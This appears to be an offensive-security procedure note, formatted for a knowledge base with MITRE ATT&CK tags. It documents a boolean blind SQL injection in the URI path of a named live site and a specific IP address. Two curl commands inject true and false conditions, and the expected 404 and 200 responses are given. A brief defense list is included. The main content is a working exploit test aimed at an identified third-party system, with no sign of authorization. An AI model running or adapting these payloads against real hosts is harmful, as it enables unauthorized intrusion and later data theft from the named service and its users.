---
tags:
  - sqli
  - blind-sqli
  - injection-test
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-sqli-test-false]]'
  - '[[commands/curl-sqli-test-true]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:46:20.374Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
id: 636ec150-298c-4c60-b78c-0abeb6fb5959
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Test-for-Blind-SQL-Injection-in-URI-Path

## Summary

This procedure tests for Boolean Blind SQL Injection by injecting true/false conditions into the URI path of /item/default, observing HTTP response differences to confirm unsanitized input in a SQL WHERE clause.

## Description

The vulnerability on 3d.cs.money allows URI path input to be directly concatenated into SQL queries without sanitization. Payloads like 'and UPPER('asd')='asd'-- (false, 404) vs. 'and UPPER('asd')='ASD'-- (true, 200) demonstrate the injection point, likely for retrieving saved skin configurations. Use Burp Suite for interception.

## Requirements

1. Burp Suite or equivalent proxy for request manipulation
2. Access to target IP (51.83.253.82)
3. Knowledge of boolean SQL syntax

## Defense

Defensive measures and detection strategies:

- Parameterize queries and use prepared statements
- WAF rules to block SQL keywords in paths
- Log and alert on anomalous response code patterns

## Objectives

1. Confirm SQL interpretation in URI path
2. Identify response-based blind detection method
3. Validate injection without direct output

## Instructions

### Step 1: Inject False Boolean Condition

**Context**: Test a condition that should return false, expecting 404 to indicate query failure.

**Command** ([[commands/curl-sqli-test-false]]):
```bash
curl -i "http://51.83.253.82/item/default'and UPPER('asd')='asd'--"
```

> Expected: HTTP/1.1 404 Not Found, confirming false condition alters query logic.

### Step 2: Inject True Boolean Condition

**Context**: Test a condition that should return true, expecting 200 to confirm successful injection.

**Command** ([[commands/curl-sqli-test-true]]):
```bash
curl -i "http://51.83.253.82/item/default'and UPPER('asd')='ASD'--"
```

> Expected: HTTP/1.1 200 OK, verifying the path influences SQL execution.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-sqli-test-false]]
- [[commands/curl-sqli-test-true]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- [[sqli]]
- [[blind-sqli]]
